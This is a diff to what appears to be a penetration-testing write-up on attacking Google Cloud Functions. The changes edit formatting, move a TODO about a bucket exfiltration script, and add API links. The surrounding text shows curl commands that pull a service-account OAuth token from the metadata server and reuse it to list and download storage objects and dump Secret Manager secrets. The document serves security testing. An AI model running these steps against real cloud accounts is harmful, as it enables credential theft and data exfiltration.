@@ -131,7 +131,7 @@ https://cloud.google.com/appengine/docs/standard/java/accessing-instance-metadat
 
 Querying the service account for interesting bits of information:
 
-```
+```bash
 curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
 
 <account-email>@developer.gserviceaccount.com
@@ -140,7 +140,7 @@ curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMeta
 
 Querying for the default aliases:
 
-```
+```bash
 curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/aliases
 
 default
@@ -148,7 +148,7 @@ default
 
 Querying for the default service accounts for the execution role:
 
-```
+```bash
 curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/
 
 aliases
@@ -160,7 +160,7 @@ token
 
 Querying the metadata service for the valid scopes:
 
-```
+```bash
 curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
 
 
@@ -181,7 +181,7 @@ https://www.googleapis.com/auth/youtube
 
 Querying the service account authentication token, which appears to be valid for 30 minutes.
 
-```
+```bash
 curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
 {"access_token":"ya29.c.ABC123","expires_in":1676,"token_type":"Bearer"}
 ```
@@ -190,14 +190,14 @@ curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMeta
 
 At the time of this writing, I have not found a way to load up the OAuth access token and use it from the `gcloud` command line interface. This overall makes it harder to run commands against the account, but can still be done directly against the API using a proxy tool, Burp, or by using the SDK from a script (Python, Java, .NET, etc.).
 
-TODO: Write a bucket exhilaration script to do the following for us for all buckets and all items in the project.
-
 Set the *access_token* and project environment variables locally using the values obtained from the function execution environment.
 
 ```bash
 export GOOGLE_ACCESS_TOKEN=<INSERT ACCESS TOKEN>
 export GOOGLE_PROJECT=<GOOGLE PROJECT>
 ```
+
+TODO: Write a bucket exfiltration script to do the following for us for all buckets and all items in the project. See the [Cloud Storage JSON API](https://cloud.google.com/storage/docs/json_api/) for details.
 
 List the buckets for the project and query the first bucket:
 
@@ -219,7 +219,7 @@ export GOOGLE_BUCKET_ITEM=$(curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOK
 curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" "$GOOGLE_BUCKET_ITEM?alt=media" --output ~/Downloads/cheetah.jpg
 ```
 
-List the secrets in the project:
+At the time of this writing, the secrets manager appears to still be in Beta. See the [API Reference](https://cloud.google.com/secret-manager/docs/reference/rest/v1beta1/projects.secrets) for details on accessing the API. List the secrets in the project:
 
 ```bash
 curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" https://secretmanager.googleapis.com/v1beta1/projects/$GOOGLE_PROJECT/secrets
@@ -227,14 +227,14 @@ curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" https://secretmanager.go
 
 Dump the secret value:
 
-```
+```bash
 export SECRET_NAME=$(curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" https://secretmanager.googleapis.com/v1beta1/projects/$GOOGLE_PROJECT/secrets | jq -r '.secrets[0].name')
 curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" https://secretmanager.googleapis.com/v1beta1/$SECRET_NAME/versions/latest:access
 ```
 
 By default this returns a *403* from the service account running the function:
 
-```
+```json
 {
   "error": {
     "code": 403,
@@ -247,7 +247,7 @@ By default this returns a *403* from the service account running the function:
 It appears this is not included the default editor role permissions. You have to explicitly grant the service account the Secret Manager Secret Accessor (secretmanager.versions.access) permission to view the secret value. Then, running the command returns the following:
 
 
-```
+```bash
 curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" https://secretmanager.googleapis.com/v1beta1/$SECRET_NAME/versions/latest:access
 
 {
